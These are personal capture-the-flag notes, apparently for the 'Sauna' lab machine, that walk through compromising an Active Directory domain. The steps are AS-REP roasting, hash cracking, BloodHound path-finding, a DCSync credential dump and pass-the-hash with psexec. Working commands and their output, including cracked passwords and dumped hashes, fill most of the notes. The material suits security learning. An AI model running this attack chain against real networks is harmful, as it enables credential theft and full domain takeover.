- enumerated for subdomains no luck
- no usernames and need to enumerate ldap
- Trying Username anarchy https://github.com/urbanadventurer/username-anarchy
```
/opt/username-anarchy/username-anarchy -i names.txt --select-format firstlast,first.last,f.last,flast,lfirst,l.first,lastf,last.f,last.first,FLast,FirstLast,First.Last > guess_usernames.txt
```
- Searching for recon usernames and asrep-roastable with get-npusers
```
impacket-GetNPUsers -dc-ip 10.10.10.175 egotistical-bank.local/ -usersfile guess_usernames.txt -format hashcat -outputfile hashes.domain.txt
```
- Got a hash
```
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:89d2a903630fbe5d264d47dc365f162a$3c57dab680ac591184837a7c2e64b82ab3ad8bd6cf7a632fd35c1f5660f2a252f7080022b69667dee77e2eebef0284431a67a33a50c1e1ec8ba25d94f3bd94baa7c7a026f5c945defa1635c260f71a46fca361d557913e893cb4a5802860a16798e1e9462891d8fe6d8f293d89b99a31df44e405b5a2b6cecad52b03520e7e8a3ce62c9181763d4033c4b985919a84a636fc3b20710979d8d22a23164dabee06fe8b7de0bf3747b3ebcb9059454077f1f87df22b1f5ce7710ad8fc78061b6265de6e46dfc39503d8b25103d118ca592f7fc3e65e1fa16df41946eb5337c9754c4ae389d3573c840ee350a2fd41ba30b2da3be8e24e24f2c91da42612f48060d3
```
- Cracking with hashcat
```
hashcat -m 18200 hashes.domain.txt /usr/share/wordlists/rockyou.txt -o cracked.txt --force
```
- Got the password
```
Thestrokes23 for fsmith@egotistical-bank.local
```
- Grab a user flag with evil-winrm real quick
```
evil-winrm -i 10.10.10.175 -p Thestrokes23 
```
- Going to run a bloodhound collection to see where to go next
- uploading sharphound with evil-winrm then running with 
```
.\SharpHound.exe -c all
```
- Downloading the output to notes and uploading to git
- Running bloodhound for analysis by navigating to the folder with the docker-compose image for bloodhound and running 
```
docker-compose up
```
- Nothing on bloodhound
- HSmith is kerberoastable but I keep getting errors
- Running winPEAs
- Found password for svc_loanmgr
```
Moneymakestheworldgoround!
```
- Running bloodhound again to look for paths
- Get-Changes property was enabled and bloodhound recommended secretsdump
- Got the following output with secretsdump
```
impacket-secretsdump 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@10.10.10.175
```
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:e860d7678a2c515fc5df17c692c08e1d:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:b3bbe70ed412255bcd06ef8175202e94e855896d7de69da247198ddf3bc4e6f6
SAUNA$:aes128-cts-hmac-sha1-96:6d74ef7f810d23818bbb617f61c8f8bf
SAUNA$:des-cbc-md5:70b0d086aeb36e38
[*] Cleaning up...
```
- got shell with psexec after a couple of tries where the connection timed out
```
impacket-psexec egotistical-bank.local/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```
- Got root.txt
